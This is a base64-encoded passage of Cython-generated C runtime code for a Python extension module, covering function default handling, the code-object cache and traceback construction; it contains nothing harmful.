CAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIHJldHVybiAwOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0luaXREZWZhdWx0cyhQeU9iamVjdCAqZnVuYywgUHlUeXBlT2JqZWN0ICpkZWZhdWx0c190eXBlKSB7CiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgZnVuYzsKICAgIG0tPmRlZmF1bHRzID0gUHlPYmplY3RfQ2FsbE9iamVjdCgoUHlPYmplY3QqKWRlZmF1bHRzX3R5cGUsIE5VTEwpOyAvLyBfUHlPYmplY3RfTmV3KGRlZmF1bHRzX3R5cGUpOwogICAgaWYgKHVubGlrZWx5KCFtLT5kZWZhdWx0cykpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICByZXR1cm4gbS0+ZGVmYXVsdHM7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX1NldERlZmF1bHRzVHVwbGUoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICp0dXBsZSkgewogICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqbSA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopIGZ1bmM7CiAgICBtLT5kZWZhdWx0c190dXBsZSA9IHR1cGxlOwogICAgUHlfSU5DUkVGKHR1cGxlKTsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0RGVmYXVsdHNLd0RpY3QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpkaWN0KSB7CiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgZnVuYzsKICAgIG0tPmRlZmF1bHRzX2t3ZGljdCA9IGRpY3Q7CiAgICBQeV9JTkNSRUYoZGljdCk7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX1NldEFubm90YXRpb25zRGljdChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmRpY3QpIHsKICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0gPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSBmdW5jOwogICAgbS0+ZnVuY19hbm5vdGF0aW9ucyA9IGRpY3Q7CiAgICBQeV9JTkNSRUYoZGljdCk7Cn0KCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fTmV3KFB5TWV0aG9kRGVmICptbCwgaW50IGZsYWdzLCBQeU9iamVjdCogcXVhbG5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmNsb3N1cmUsIFB5T2JqZWN0ICptb2R1bGUsIFB5T2JqZWN0KiBnbG9iYWxzLCBQeU9iamVjdCogY29kZSkgewogICAgUHlPYmplY3QgKm9wID0gX19QeXhfQ3lGdW5jdGlvbl9Jbml0KAogICAgICAgIFB5T2JqZWN0X0dDX05ldyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSksCiAgICAgICAgbWwsIGZsYWdzLCBxdWFsbmFtZSwgY2xvc3VyZSwgbW9kdWxlLCBnbG9iYWxzLCBjb2RlCiAgICApOwogICAgaWYgKGxpa2VseShvcCkpIHsKICAgICAgICBQeU9iamVjdF9HQ19UcmFjayhvcCk7CiAgICB9CiAgICByZXR1cm4gb3A7Cn0KCgojaWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSyAmJiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLX1JVTlRJTUUKc3RhdGljIGludCBfX1B5eF9DTGluZUZvclRyYWNlYmFjayhQeVRocmVhZFN0YXRlICp0c3RhdGUsIGludCBjX2xpbmUpIHsKICAgIFB5T2JqZWN0ICp1c2VfY2xpbmU7CiAgICBQeU9iamVjdCAqcHR5cGUsICpwdmFsdWUsICpwdHJhY2ViYWNrOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICBQeU9iamVjdCAqKmN5dGhvbl9ydW50aW1lX2RpY3Q7CiNlbmRpZgogICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIodHN0YXRlKTsKICAgIGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY3l0aG9uX3J1bnRpbWUpKSB7CiAgICAgICAgcmV0dXJuIGNfbGluZTsKICAgIH0KICAgIF9fUHl4X0VyckZldGNoSW5TdGF0ZSh0c3RhdGUsICZwdHlwZSwgJnB2YWx1ZSwgJnB0cmFjZWJhY2spOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICBjeXRob25fcnVudGltZV9kaWN0ID0gX1B5T2JqZWN0X0dldERpY3RQdHIoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY3l0aG9uX3J1bnRpbWUpOwogICAgaWYgKGxpa2VseShjeXRob25fcnVudGltZV9kaWN0KSkgewogICAgICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oKmN5dGhvbl9ydW50aW1lX2RpY3QpOwogICAgICAgIF9fUFlYX1BZX0RJQ1RfTE9PS1VQX0lGX01PRElGSUVEKAogICAgICAgICAgICB1c2VfY2xpbmUsICpjeXRob25fcnVudGltZV9kaWN0LAogICAgICAgICAgICBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cigqY3l0aG9uX3J1bnRpbWVfZGljdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsaW5lX2luX3RyYWNlYmFjaykpCiAgICAgICAgUHlfWElOQ1JFRih1c2VfY2xpbmUpOwogICAgICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICB9IGVsc2UKI2VuZGlmCiAgICB7CiAgICAgIFB5T2JqZWN0ICp1c2VfY2xpbmVfb2JqID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY3l0aG9uX3J1bnRpbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGluZV9pbl90cmFjZWJhY2spOwogICAgICBpZiAodXNlX2NsaW5lX29iaikgewogICAgICAgIHVzZV9jbGluZSA9IFB5T2JqZWN0X05vdCh1c2VfY2xpbmVfb2JqKSA/IFB5X0ZhbHNlIDogUHlfVHJ1ZTsKICAgICAgICBQeV9JTkNSRUYodXNlX2NsaW5lKTsKICAgICAgICBQeV9ERUNSRUYodXNlX2NsaW5lX29iaik7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgICAgICB1c2VfY2xpbmUgPSBOVUxMOwogICAgICB9CiAgICB9CiAgICBpZiAoIXVzZV9jbGluZSkgewogICAgICAgIGNfbGluZSA9IDA7CiAgICAgICAgKHZvaWQpIFB5T2JqZWN0X1NldEF0dHIoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY3l0aG9uX3J1bnRpbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGluZV9pbl90cmFjZWJhY2ssIFB5X0ZhbHNlKTsKICAgIH0KICAgIGVsc2UgaWYgKHVzZV9jbGluZSA9PSBQeV9GYWxzZSB8fCAodXNlX2NsaW5lICE9IFB5X1RydWUgJiYgUHlPYmplY3RfTm90KHVzZV9jbGluZSkgIT0gMCkpIHsKICAgICAgICBjX2xpbmUgPSAwOwogICAgfQogICAgUHlfWERFQ1JFRih1c2VfY2xpbmUpOwogICAgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUodHN0YXRlLCBwdHlwZSwgcHZhbHVlLCBwdHJhY2ViYWNrKTsKICAgIHJldHVybiBjX2xpbmU7Cn0KI2VuZGlmCgoKc3RhdGljIGludCBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KiBlbnRyaWVzLCBpbnQgY291bnQsIGludCBjb2RlX2xpbmUpIHsKICAgIGludCBzdGFydCA9IDAsIG1pZCA9IDAsIGVuZCA9IGNvdW50IC0gMTsKICAgIGlmIChlbmQgPj0gMCAmJiBjb2RlX2xpbmUgPiBlbnRyaWVzW2VuZF0uY29kZV9saW5lKSB7CiAgICAgICAgcmV0dXJuIGNvdW50OwogICAgfQogICAgd2hpbGUgKHN0YXJ0IDwgZW5kKSB7CiAgICAgICAgbWlkID0gc3RhcnQgKyAoZW5kIC0gc3RhcnQpIC8gMjsKICAgICAgICBpZiAoY29kZV9saW5lIDwgZW50cmllc1ttaWRdLmNvZGVfbGluZSkgewogICAgICAgICAgICBlbmQgPSBtaWQ7CiAgICAgICAgfSBlbHNlIGlmIChjb2RlX2xpbmUgPiBlbnRyaWVzW21pZF0uY29kZV9saW5lKSB7CiAgICAgICAgICAgICBzdGFydCA9IG1pZCArIDE7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmV0dXJuIG1pZDsKICAgICAgICB9CiAgICB9CiAgICBpZiAoY29kZV9saW5lIDw9IGVudHJpZXNbbWlkXS5jb2RlX2xpbmUpIHsKICAgICAgICByZXR1cm4gbWlkOwogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gbWlkICsgMTsKICAgIH0KfQpzdGF0aWMgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUgKl9fcHl4X19maW5kX2NvZGVfb2JqZWN0KHN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgKmNvZGVfY2FjaGUsIGludCBjb2RlX2xpbmUpIHsKICAgIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiBjb2RlX29iamVjdDsKICAgIGludCBwb3M7CiAgICBpZiAodW5saWtlbHkoIWNvZGVfbGluZSkgfHwgdW5saWtlbHkoIWNvZGVfY2FjaGUtPmVudHJpZXMpKSB7CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiAgICBwb3MgPSBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKGNvZGVfY2FjaGUtPmVudHJpZXMsIGNvZGVfY2FjaGUtPmNvdW50LCBjb2RlX2xpbmUpOwogICAgaWYgKHVubGlrZWx5KHBvcyA+PSBjb2RlX2NhY2hlLT5jb3VudCkgfHwgdW5saWtlbHkoY29kZV9jYWNoZS0+ZW50cmllc1twb3NdLmNvZGVfbGluZSAhPSBjb2RlX2xpbmUpKSB7CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiAgICBjb2RlX29iamVjdCA9IGNvZGVfY2FjaGUtPmVudHJpZXNbcG9zXS5jb2RlX29iamVjdDsKICAgIFB5X0lOQ1JFRihjb2RlX29iamVjdCk7CiAgICByZXR1cm4gY29kZV9vYmplY3Q7Cn0Kc3RhdGljIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlICpfX3B5eF9maW5kX2NvZGVfb2JqZWN0KGludCBjb2RlX2xpbmUpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HICYmICFDWVRIT05fQVRPTUlDUwogICAgKHZvaWQpX19weXhfX2ZpbmRfY29kZV9vYmplY3Q7CiAgICByZXR1cm4gTlVMTDsgLy8gTW9zdCBpbXBsZW1lbnRhdGlvbiBzaG91bGQgaGF2ZSBhdG9taWNzLiBCdXQgb3RoZXJ3aXNlLCBkb24ndCBtYWtlIGl0IHRocmVhZC1zYWZlLCBqdXN0IG1pc3MuCiNlbHNlCiAgICBzdHJ1Y3QgX19QeXhfQ29kZU9iamVjdENhY2hlICpjb2RlX2NhY2hlID0gJl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVfY2FjaGU7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIG9sZF9jb3VudCA9IF9fcHl4X2F0b21pY19pbmNyX2FjcV9yZWwoJmNvZGVfY2FjaGUtPmFjY2Vzc29yX2NvdW50KTsKICAgIGlmIChvbGRfY291bnQgPCAwKSB7CiAgICAgICAgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCgmY29kZV9jYWNoZS0+YWNjZXNzb3JfY291bnQpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQojZW5kaWYKICAgIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlICpyZXN1bHQgPSBfX3B5eF9fZmluZF9jb2RlX29iamVjdChjb2RlX2NhY2hlLCBjb2RlX2xpbmUpOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcKICAgIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwoJmNvZGVfY2FjaGUtPmFjY2Vzc29yX2NvdW50KTsKI2VuZGlmCiAgICByZXR1cm4gcmVzdWx0OwojZW5kaWYKfQpzdGF0aWMgdm9pZCBfX3B5eF9faW5zZXJ0X2NvZGVfb2JqZWN0KHN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgKmNvZGVfY2FjaGUsIGludCBjb2RlX2xpbmUsIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiBjb2RlX29iamVjdCkKewogICAgaW50IHBvcywgaTsKICAgIF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KiBlbnRyaWVzID0gY29kZV9jYWNoZS0+ZW50cmllczsKICAgIGlmICh1bmxpa2VseSghY29kZV9saW5lKSkgewogICAgICAgIHJldHVybjsKICAgIH0KICAgIGlmICh1bmxpa2VseSghZW50cmllcykpIHsKICAgICAgICBlbnRyaWVzID0gKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KilQeU1lbV9NYWxsb2MoNjQqc2l6ZW9mKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KSk7CiAgICAgICAgaWYgKGxpa2VseShlbnRyaWVzKSkgewogICAgICAgICAgICBjb2RlX2NhY2hlLT5lbnRyaWVzID0gZW50cmllczsKICAgICAgICAgICAgY29kZV9jYWNoZS0+bWF4X2NvdW50ID0gNjQ7CiAgICAgICAgICAgIGNvZGVfY2FjaGUtPmNvdW50ID0gMTsKICAgICAgICAgICAgZW50cmllc1swXS5jb2RlX2xpbmUgPSBjb2RlX2xpbmU7CiAgICAgICAgICAgIGVudHJpZXNbMF0uY29kZV9vYmplY3QgPSBjb2RlX29iamVjdDsKICAgICAgICAgICAgUHlfSU5DUkVGKGNvZGVfb2JqZWN0KTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgcG9zID0gX19weXhfYmlzZWN0X2NvZGVfb2JqZWN0cyhjb2RlX2NhY2hlLT5lbnRyaWVzLCBjb2RlX2NhY2hlLT5jb3VudCwgY29kZV9saW5lKTsKICAgIGlmICgocG9zIDwgY29kZV9jYWNoZS0+Y291bnQpICYmIHVubGlrZWx5KGNvZGVfY2FjaGUtPmVudHJpZXNbcG9zXS5jb2RlX2xpbmUgPT0gY29kZV9saW5lKSkgewogICAgICAgIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiB0bXAgPSBlbnRyaWVzW3Bvc10uY29kZV9vYmplY3Q7CiAgICAgICAgZW50cmllc1twb3NdLmNvZGVfb2JqZWN0ID0gY29kZV9vYmplY3Q7CiAgICAgICAgUHlfSU5DUkVGKGNvZGVfb2JqZWN0KTsKICAgICAgICBQeV9ERUNSRUYodG1wKTsKICAgICAgICByZXR1cm47CiAgICB9CiAgICBpZiAoY29kZV9jYWNoZS0+Y291bnQgPT0gY29kZV9jYWNoZS0+bWF4X2NvdW50KSB7CiAgICAgICAgaW50IG5ld19tYXggPSBjb2RlX2NhY2hlLT5tYXhfY291bnQgKyA2NDsKICAgICAgICBlbnRyaWVzID0gKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KilQeU1lbV9SZWFsbG9jKAogICAgICAgICAgICBjb2RlX2NhY2hlLT5lbnRyaWVzLCAoKHNpemVfdCluZXdfbWF4KSAqIHNpemVvZihfX1B5eF9Db2RlT2JqZWN0Q2FjaGVFbnRyeSkpOwogICAgICAgIGlmICh1bmxpa2VseSghZW50cmllcykpIHsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICBjb2RlX2NhY2hlLT5lbnRyaWVzID0gZW50cmllczsKICAgICAgICBjb2RlX2NhY2hlLT5tYXhfY291bnQgPSBuZXdfbWF4OwogICAgfQogICAgZm9yIChpPWNvZGVfY2FjaGUtPmNvdW50OyBpPnBvczsgaS0tKSB7CiAgICAgICAgZW50cmllc1tpXSA9IGVudHJpZXNbaS0xXTsKICAgIH0KICAgIGVudHJpZXNbcG9zXS5jb2RlX2xpbmUgPSBjb2RlX2xpbmU7CiAgICBlbnRyaWVzW3Bvc10uY29kZV9vYmplY3QgPSBjb2RlX29iamVjdDsKICAgIGNvZGVfY2FjaGUtPmNvdW50Kys7CiAgICBQeV9JTkNSRUYoY29kZV9vYmplY3QpOwp9CnN0YXRpYyB2b2lkIF9fcHl4X2luc2VydF9jb2RlX29iamVjdChpbnQgY29kZV9saW5lLCBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSogY29kZV9vYmplY3QpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HICYmICFDWVRIT05fQVRPTUlDUwogICAgKHZvaWQpX19weXhfX2luc2VydF9jb2RlX29iamVjdDsKICAgIHJldHVybjsgLy8gTW9zdCBpbXBsZW1lbnRhdGlvbiBzaG91bGQgaGF2ZSBhdG9taWNzLiBCdXQgb3RoZXJ3aXNlLCBkb24ndCBtYWtlIGl0IHRocmVhZC1zYWZlLCBqdXN0IGZhaWwuCiNlbHNlCiAgICBzdHJ1Y3QgX19QeXhfQ29kZU9iamVjdENhY2hlICpjb2RlX2NhY2hlID0gJl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVfY2FjaGU7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIGV4cGVjdGVkID0gMDsKICAgIGlmICghX19weXhfYXRvbWljX2ludF9jbXBfZXhjaGFuZ2UoJmNvZGVfY2FjaGUtPmFjY2Vzc29yX2NvdW50LCAmZXhwZWN0ZWQsIElOVF9NSU4pKSB7CiAgICAgICAgcmV0dXJuOwogICAgfQojZW5kaWYKICAgIF9fcHl4X19pbnNlcnRfY29kZV9vYmplY3QoY29kZV9jYWNoZSwgY29kZV9saW5lLCBjb2RlX29iamVjdCk7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgX19weXhfYXRvbWljX3N1YigmY29kZV9jYWNoZS0+YWNjZXNzb3JfY291bnQsIElOVF9NSU4pOwojZW5kaWYKI2VuZGlmCn0KCgojaW5jbHVkZSAiY29tcGlsZS5oIgojaW5jbHVkZSAiZnJhbWVvYmplY3QuaCIKI2luY2x1ZGUgInRyYWNlYmFjay5oIgojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBiMDBhNiAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiAhZGVmaW5lZChQWVBZX1ZFUlNJT04pCiAgI2lmbmRlZiBQeV9CVUlMRF9DT1JFCiAgICAjZGVmaW5lIFB5X0JVSUxEX0NPUkUgMQogICNlbmRpZgogICNpbmNsdWRlICJpbnRlcm5hbC9weWNvcmVfZnJhbWUuaCIKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlDb2RlX1JlcGxhY2VfRm9yX0FkZFRyYWNlYmFjayhQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKnNjcmF0Y2hfZGljdCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpmaXJzdGxpbmVubywgUHlPYmplY3QgKm5hbWUpIHsKICAgIFB5T2JqZWN0ICpyZXBsYWNlID0gTlVMTDsKICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbVN0cmluZyhzY3JhdGNoX2RpY3QsICJjb19maXJzdGxpbmVubyIsIGZpcnN0bGluZW5vKSkpIHJldHVybiBOVUxMOwogICAgaWYgKHVubGlrZWx5KFB5RGljdF9TZXRJdGVtU3RyaW5nKHNjcmF0Y2hfZGljdCwgImNvX25hbWUiLCBuYW1lKSkpIHJldHVybiBOVUxMOwogICAgcmVwbGFjZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoY29kZSwgInJlcGxhY2UiKTsKICAgIGlmIChsaWtlbHkocmVwbGFjZSkpIHsKICAgICAgICBQeU9iamVjdCAqcmVzdWx0ID0gUHlPYmplY3RfQ2FsbChyZXBsYWNlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSwgc2NyYXRjaF9kaWN0KTsKICAgICAgICBQeV9ERUNSRUYocmVwbGFjZSk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KICAgIFB5RXJyX0NsZWFyKCk7CiAgICByZXR1cm4gTlVMTDsKfQpzdGF0aWMgdm9pZCBfX1B5eF9BZGRUcmFjZWJhY2soY29uc3QgY2hhciAqZnVuY25hbWUsIGludCBjX2xpbmUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgcHlfbGluZSwgY29uc3QgY2hhciAqZmlsZW5hbWUpIHsKICAgIFB5T2JqZWN0ICpjb2RlX29iamVjdCA9IE5VTEwsICpweV9weV9saW5lID0gTlVMTCwgKnB5X2Z1bmNuYW1lID0gTlVMTCwgKmRpY3QgPSBOVUxMOwogICAgUHlPYmplY3QgKnJlcGxhY2UgPSBOVUxMLCAqZ2V0ZnJhbWUgPSBOVUxMLCAqZnJhbWUgPSBOVUxMOwogICAgUHlPYmplY3QgKmV4Y190eXBlLCAqZXhjX3ZhbHVlLCAqZXhjX3RyYWNlYmFjazsKICAgIGludCBzdWNjZXNzID0gMDsKICAgIGlmIChjX2xpbmUpIHsKICAgICAgICAodm9pZCkgX19weXhfY2ZpbGVubTsKICAgICAgICAodm9pZCkgX19QeXhfQ0xpbmVGb3JUcmFjZWJhY2soX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50LCBjX2xpbmUpOwogICAgfQogICAgUHlFcnJfRmV0Y2goJmV4Y190eXBlLCAmZXhjX3ZhbHVlLCAmZXhjX3RyYWNlYmFjayk7CiAgICBjb2RlX29iamVjdCA9IF9fcHl4X2ZpbmRfY29kZV9vYmplY3QoY19saW5lID8gLWNfbGluZSA6IHB5X2xpbmUpOwogICAgaWYgKCFjb2RlX29iamVjdCkgewogICAgICAgIGNvZGVfb2JqZWN0ID0gUHlfQ29tcGlsZVN0cmluZygiX2dldGZyYW1lKCkiLCBmaWxlbmFtZSwgUHlfZXZhbF9pbnB1dCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFjb2RlX29iamVjdCkpIGdvdG8gYmFkOwogICAgICAgIHB5X3B5X2xpbmUgPSBQeUxvbmdfRnJvbUxvbmcocHlfbGluZSk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFweV9weV9saW5lKSkgZ290byBiYWQ7CiAgICAgICAgcHlfZnVuY25hbWUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhmdW5jbmFtZSk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFweV9mdW5jbmFtZSkpIGdvdG8gYmFkOwogICAgICAgIGRpY3QgPSBQeURpY3RfTmV3KCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFkaWN0KSkgZ290byBiYWQ7CiAgICAgICAgewogICAgICAgICAgICBQeU9iamVjdCAqb2xkX2NvZGVfb2JqZWN0ID0gY29kZV9vYmplY3Q7CiAgICAgICAgICAgIGNvZGVfb2JqZWN0ID0gX19QeXhfUHlDb2RlX1JlcGxhY2VfRm9yX0FkZFRyYWNlYmFjayhjb2RlX29iamVjdCwgZGljdCwgcHlfcHlfbGluZSwgcHlfZnVuY25hbWUpOwogICAgICAgICAgICBQeV9ERUNSRUYob2xkX2NvZGVfb2JqZWN0KTsKICAgICAgICB9CiAgICAgICAgaWYgKHVubGlrZWx5KCFjb2RlX29iamVjdCkpIGdvdG8gYmFkOwogICAgICAgIF9fcHl4X2luc2VydF9jb2RlX29iamVjdChjX2xpbmUgPyAtY19saW5lIDogcHlfbGluZSwgY29kZV9vYmplY3QpOwogICAgfSBlbHNlIHsKICAgICAgICBkaWN0ID0gUHlEaWN0X05ldygpOwogICAgfQogICAgZ2V0ZnJhbWUgPSBQeVN5c19HZXRPYmplY3QoIl9nZXRmcmFtZSIpOwogICAgaWYgKHVubGlrZWx5KCFnZXRmcmFtZSkpIGdvdG8gYmFkOwogICAgaWYgKHVubGlrZWx5KFB5RGljdF9TZXRJdGVtU3RyaW5nKGRpY3QsICJfZ2V0ZnJhbWUiLCBnZXRmcmFtZSkpKSBnb3RvIGJhZDsKICAgIGZyYW1lID0gUHlFdmFsX0V2YWxDb2RlKGNvZGVfb2JqZWN0LCBkaWN0LCBkaWN0KTsKICAgIGlmICh1bmxpa2VseSghZnJhbWUpIHx8IGZyYW1lID09IFB5X05vbmUpIGdvdG8gYmFkOwogICAgc3VjY2VzcyA9IDE7CiAgYmFkOgogICAgUHlFcnJfUmVzdG9yZShleGNfdHlwZSwgZXhjX3ZhbHVlLCBleGNfdHJhY2ViYWNrKTsKICAgIFB5X1hERUNSRUYoY29kZV9vYmplY3QpOwogICAgUHlfWERFQ1JFRihweV9weV9saW5lKTsKICAgIFB5X1hERUNSRUYocHlfZnVuY25hbWUpOwogICAgUHlfWERFQ1JFRihkaWN0KTsKICAgIFB5X1hERUNSRUYocmVwbGFjZSk7CiAgICBpZiAoc3VjY2VzcykgewogICAgICAgIFB5VHJhY2VCYWNrX0hlcmUoCiAgICAgICAgICAgIChzdHJ1Y3QgX2ZyYW1lKilmcmFtZSk7CiAgICB9CiAgICBQeV9YREVDUkVGKGZyYW1lKTsKfQojZWxzZQpzdGF0aWMgUHlDb2RlT2JqZWN0KiBfX1B5eF9DcmVhdGVDb2RlT2JqZWN0Rm9yVHJhY2ViYWNrKAogICAgICAgICAgICBjb25zdCBjaGFyICpmdW5jbmFtZSwgaW50IGNfbGluZSwKICAgICAgICAgICAgaW50IHB5X2xpbmUsIGNvbnN0IGNoYXIgKmZpbGVuYW1lKSB7CiAgICBQeUNvZGVPYmplY3QgKnB5X2NvZGUgPSBOVUxMOwogICAgUHlPYmplY3QgKnB5X2Z1bmNuYW1lID0gTlVMTDsKICAgIGlmIChjX2xpbmUpIHsKICAgICAgICBweV9mdW5jbmFtZSA9IFB5VW5pY29kZV9Gcm9tRm9ybWF0KCAiJXMgKCVzOiVkKSIsIGZ1bmNuYW1lLCBfX3B5eF9jZmlsZW5tLCBjX2xpbmUpOwogICAgICAgIGlmICghcHlfZnVuY25hbWUpIGdvdG8gYmFkOwogICAgICAgIGZ1bmNuYW1lID0gUHlVbmljb2RlX0FzVVRGOChweV9mdW5jbmFtZSk7CiAgICAgICAgaWYgKCFmdW5jbmFtZSkgZ290byBiYWQ7CiAgICB9CiAgICBweV9jb2RlID0gUHlDb2RlX05ld0VtcHR5KGZpbGVuYW1lLCBmdW5jbmFtZSwgcHlfbGluZSk7CiAgICBQeV9YREVDUkVGKHB5X2Z1bmNuYW1lKTsKICAgIHJldHVybiBweV9jb2RlOwpiYWQ6CiAgICBQeV9YREVDUkVGKHB5X2Z1bmNuYW1lKTsKICAgIHJldHVybiBOVUxMOwp9CnN0YXRpYyB2b2lkIF9fUHl4X0FkZFRyYWNlYmFjayhjb25zdCBjaGFyICpmdW5jbmFtZSwgaW50IGNfbGluZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBweV9saW5lLCBjb25zdCBjaGFyICpmaWxlbmFtZSkgewogICAgUHlDb2RlT2JqZWN0ICpweV9jb2RlID0gMDsKICAgIFB5RnJhbWVPYmplY3QgKnB5X2ZyYW1lID0gMDsKICAgIFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSA9IF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudDsKICAgIFB5T2JqZWN0ICpwdHlwZSwgKnB2YWx1ZSwgKnB0cmFjZWJhY2s7CiAgICBpZiAoY19saW5lKSB7CiAgICAgICAgY19saW5lID0gX19QeXhfQ0xpbmVGb3JUcmFjZWJhY2sodHN0YXRlLCBjX2xpbmUpOwogICAgfQogICAgcHlfY29kZSA9IF9fcHl4X2ZpbmRfY29kZV9vYmplY3QoY19saW5lID8gLWNfbGluZSA6IHB5X2xpbmUpOwogICAgaWYgKCFweV9jb2RlKSB7CiAgICAgICAgX19QeXhfRXJyRmV0Y2hJblN0YXRlKHRzdGF0ZSwgJnB0eXBlLCAmcHZhbHVlLCAmcHRyYWNlYmFjayk7CiAgICAgICAgcHlfY29kZSA9IF9fUHl4X0NyZWF0Z